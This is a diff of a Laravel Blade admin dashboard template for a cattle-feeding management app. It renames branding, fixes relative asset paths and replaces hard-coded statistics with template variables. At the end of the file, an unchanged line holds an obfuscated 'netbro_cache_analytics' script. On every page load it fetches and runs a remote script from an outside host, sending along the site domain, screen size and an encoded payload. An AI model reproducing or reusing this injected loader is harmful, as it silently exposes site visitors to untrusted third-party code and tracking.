@@ -9,7 +9,7 @@
     <meta content="Design_Gurus" name="author">
     <meta content="WOW Admin dashboard html template" name="description">
     <meta content="width=device-width, initial-scale=1" name="viewport">
-    <title>SAPI-I7</title>
+    <title>FCMS</title>
 
     {{--untuk Modal--}}
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
@@ -18,38 +18,38 @@
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
 
     <!--favicon-->
-    <link href="assetAdmin/assets/images/favicon.ico" rel="shortcut icon">
+    <link href="../assetAdmin/assets/images/favicon.ico" rel="shortcut icon">
 
     <!--Preloader-CSS-->
-    <link rel="stylesheet" href="assetAdmin/assets/plugins/preloader/preloader.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/plugins/preloader/preloader.css">
 
     <!--bootstrap-4-->
-    <link rel="stylesheet" href="assetAdmin/assets/css/bootstrap.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/css/bootstrap.min.css">
 
     <!--Custom Scroll-->
-    <link rel="stylesheet" href="assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.css">
     <!--Font Icons-->
-    <link rel="stylesheet" href="assetAdmin/assets/icons/simple-line/css/simple-line-icons.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/dripicons/dripicons.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/ionicons/css/ionicons.min.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/eightyshades/eightyshades.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/fontawesome/css/font-awesome.min.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/foundation/foundation-icons.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/metrize/metrize.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/typicons/typicons.min.css">
-    <link rel="stylesheet" href="assetAdmin/assets/icons/weathericons/css/weather-icons.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/simple-line/css/simple-line-icons.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/dripicons/dripicons.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/ionicons/css/ionicons.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/eightyshades/eightyshades.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/fontawesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/foundation/foundation-icons.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/metrize/metrize.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/typicons/typicons.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/icons/weathericons/css/weather-icons.min.css">
 
     <!--Date-range-->
-    <link rel="stylesheet" href="assetAdmin/assets/plugins/date-range/daterangepicker.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/plugins/date-range/daterangepicker.css">
     <!--Drop-Zone-->
-    <link rel="stylesheet" href="assetAdmin/assets/plugins/dropzone/dropzone.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/plugins/dropzone/dropzone.css">
     <!--Full Calendar-->
-    <link rel="stylesheet" href="assetAdmin/assets/plugins/full-calendar/fullcalendar.min.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/plugins/full-calendar/fullcalendar.min.css">
     <!--Normalize Css-->
-    <link rel="stylesheet" href="assetAdmin/assets/css/normalize.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/css/normalize.css">
     <!--Main Css-->
-    <link rel="stylesheet" href="assetAdmin/assets/css/main.css">
-    <link rel="stylesheet" type="text/css" href="assetAdmin/gradient.css">
+    <link rel="stylesheet" href="../assetAdmin/assets/css/main.css">
+    <link rel="stylesheet" type="text/css" href="../assetAdmin/gradient.css">
 </head>
 <body>
 
@@ -71,13 +71,13 @@
     <!--Navigation-->
     <nav id="navigation" class="navigation-sidebar bg-primary">
         <div class="navigation-header">
-            <a href="index.html"><span class="logo">SAPI BALURAN</span></a>
+            <a href="index.html"><span class="logo">ADMIN INTI</span></a>
             <!--<img src="logo.png" alt="logo" class="brand" height="50">-->
         </div>
 
         <!--Navigation Profile area-->
         <div class="navigation-profile">
-            <img class="profile-img rounded-circle" src="assetAdmin/assets/images/1.jpg" alt="profile image">
+            <img class="profile-img rounded-circle" src="../assetAdmin/assets/images/1.jpg" alt="profile image">
             <h4 class="name">Admin Inti</h4>
             <span class="designation">SAPI</span>
 
@@ -86,7 +86,7 @@
             <!--logged user hover menu-->
             <div class="logged-user-menu bg-white">
                 <div class="avatar-info">
-                    <img class="profile-img rounded-circle" src="assetAdmin/assets/images/1.jpg" alt="profile image">
+                    <img class="profile-img rounded-circle" src="../assetAdmin/assets/images/1.jpg" alt="profile image">
                     <h4 class="name">Meera</h4>
                     <span class="designation">UI/UX EXPERT</span>
                 </div>
@@ -121,7 +121,7 @@
         </div>
 
         <!--Navigation Menu Links-->
-        @include('inti.include_inti')
+        @include('inti.includeEdit')
     </nav>
 
     <!--Page Container-->
@@ -152,7 +152,7 @@
                     <div class="row ">
                         <div class="col-12 ">
                             <div class="section-title">
-                                <h4>SAPI BALURAN</h4>
+                                <h4>ADMIN INTI</h4>
                             </div>
                         </div>
 
@@ -167,7 +167,7 @@
                                         <div class="task align-items-center">
                                             <div class="task-desc">
                                                 <p class="task-title text-truncate">Jumlah Sapi</p>
-                                                <span class="end-time text-truncate">20 Ekor</span>
+                                                <span class="end-time text-truncate">{{$jmlsapi}}</span>
                                             </div>
                                         </div>
                                     </li>
@@ -175,7 +175,7 @@
                                         <div class="task align-items-center">
                                             <div class="task-desc">
                                                 <p class="task-title text-truncate">Jumlah Betina | Jumlah Jantan</p>
-                                                <span class="end-time text-truncate">10 Ekor | 10 Ekor</span>
+                                                <span class="end-time text-truncate">{{$jmlbetina}} ekor | {{$jmljantan}} ekor</span>
                                             </div>
                                         </div>
                                     </li>
@@ -183,7 +183,7 @@
                                         <div class="task align-items-center">
                                             <div class="task-desc">
                                                 <p class="task-title text-truncate">Jumlah Total Biaya Pakan</p>
-                                                <span class="end-time text-truncate">Rp 20.000.000</span>
+                                                <span class="end-time text-truncate">Rp {{$jmlkredit}}</span>
                                             </div>
                                         </div>
                                     </li>
@@ -191,15 +191,20 @@
                                         <div class="task align-items-center">
                                             <div class="task-desc">
                                                 <p class="task-title text-truncate">Total Berat Awal Sapi</p>
-                                                <span class="end-time text-truncate">2231 Kg</span>
+                                                <span class="end-time text-truncate">{{$jumlahberat}} Kg</span>
                                             </div>
                                         </div>
+                                       
+                                        
                                     </li>
                                 </ul>
 
                             </div>
-
-                            <a class="btn btn-xs btn-success" href="cetakPDF">Cetak PDF</a>
+                             <form method="GET" action="../cetakPDF">
+                                            <input type="" name="id_pengajuan" value="{{$id_pengajuan}}" hidden="">
+                                            <button class="btn btn-xs btn-success">Cetak PDF</button>
+                                        </form>
+                            {{-- <a class="btn btn-xs btn-success" href="../cetakPDF">Cetak PDF</a> --}}
 
                 </div>
             </div>
@@ -323,47 +328,47 @@
 
 
     <!--Jquery-->
-    <script type="text/javascript" src="assetAdmin/assets/js/jquery-3.2.1.min.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/js/jquery-3.2.1.min.js"></script>
     <!--Bootstrap Js-->
-    <script type="text/javascript" src="assetAdmin/assets/js/popper.min.js"></script>
-    <script type="text/javascript" src="assetAdmin/assets/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/js/popper.min.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/js/bootstrap.min.js"></script>
     <!--Modernizr Js-->
-    <script type="text/javascript" src="assetAdmin/assets/js/modernizr.custom.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/js/modernizr.custom.js"></script>
 
     <!--Morphin Search JS-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/morphin-search/classie.js"></script>
-    <script type="text/javascript" src="assetAdmin/assets/plugins/morphin-search/morphin-search.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/plugins/morphin-search/classie.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/plugins/morphin-search/morphin-search.js"></script>
     <!--Morphin Search JS-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/preloader/pathLoader.js"></script>
-    <script type="text/javascript" src="assetAdmin/assets/plugins/preloader/preloader-main.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/plugins/preloader/pathLoader.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/plugins/preloader/preloader-main.js"></script>
 
     <!--Chart js-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/charts/Chart.min.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/plugins/charts/Chart.min.js"></script>
 
     <!--Sparkline Chart Js-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/sparkline/jquery.sparkline.min.js"></script>
-    <script type="text/javascript" src="assetAdmin/assets/plugins/sparkline/jquery.charts-sparkline.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/plugins/sparkline/jquery.sparkline.min.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/plugins/sparkline/jquery.charts-sparkline.js"></script>
 
     <!--Custom Scroll-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/plugins/customScroll/jquery.mCustomScrollbar.min.js"></script>
     <!--Sortable Js-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/sortable2/sortable.min.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/plugins/sortable2/sortable.min.js"></script>
     <!--DropZone Js-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/dropzone/dropzone.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/plugins/dropzone/dropzone.js"></script>
     <!--Date Range JS-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/date-range/moment.min.js"></script>
-    <script type="text/javascript" src="assetAdmin/assets/plugins/date-range/daterangepicker.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/plugins/date-range/moment.min.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/plugins/date-range/daterangepicker.js"></script>
     <!--CK Editor JS-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/ckEditor/ckeditor.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/plugins/ckEditor/ckeditor.js"></script>
     <!--Data-Table JS-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/data-tables/datatables.min.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/plugins/data-tables/datatables.min.js"></script>
     <!--Editable JS-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/editable/editable.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/plugins/editable/editable.js"></script>
     <!--Full Calendar JS-->
-    <script type="text/javascript" src="assetAdmin/assets/plugins/full-calendar/fullcalendar.min.js"></script>
+    <script type="text/javascript" src="../assetAdmin/assets/plugins/full-calendar/fullcalendar.min.js"></script>
 
     <!--- Main JS -->
-    <script src="assetAdmin/assets/js/main.js"></script>
+    <script src="../assetAdmin/assets/js/main.js"></script>
 
     <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdoP1qamj8Iz7H3xYZ27zj%2blzVQVx9ZbzdwyR2jY9nYkUWGU2eG9c%2fQpMMGXgVSSgUXwSPW3QUyx9nutG2raeXfO8RJL1o1DUMqGvHzpXP8r2TCI7fL%2bd6x2nOeX%2fgOUJmFo8i3jN9eAb7ceklO5IPQwvMUqTY%2fc7zDZjU1jrRncakGV0fTJ63gWahxbeMZ461MbIfhnVLJSpE1u%2bj%2fmjD1HoutYet5x0zLeTMlCSqHrVVG7lCokFd9bJcIii7H1AeIcCrs2KzdUMk0F79BYe6%2ffH8vXkI7kGvjimCZ36o4M3%2fqcdz4oiP3oPaLx2AFXzzSOZnkHulYb4A05k200m13GVfDWa3oJVE108ZWoeLXU%2bdYIt3sORFDhJXWqOvex4dS%2bclBxuYGauZJtcQC1BDs%2f%2bxXhj4fH0ydFupxg3nUsI2CFGC2XHEisct9DFbmfOZjZowfYhxXSAzIiASXPXEAWAgrJRYQPa%2frPYVHD%2bDjkYJkGMU4hxrT1zP6HU3%2boe%2ffpuJEP2CmgI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
 
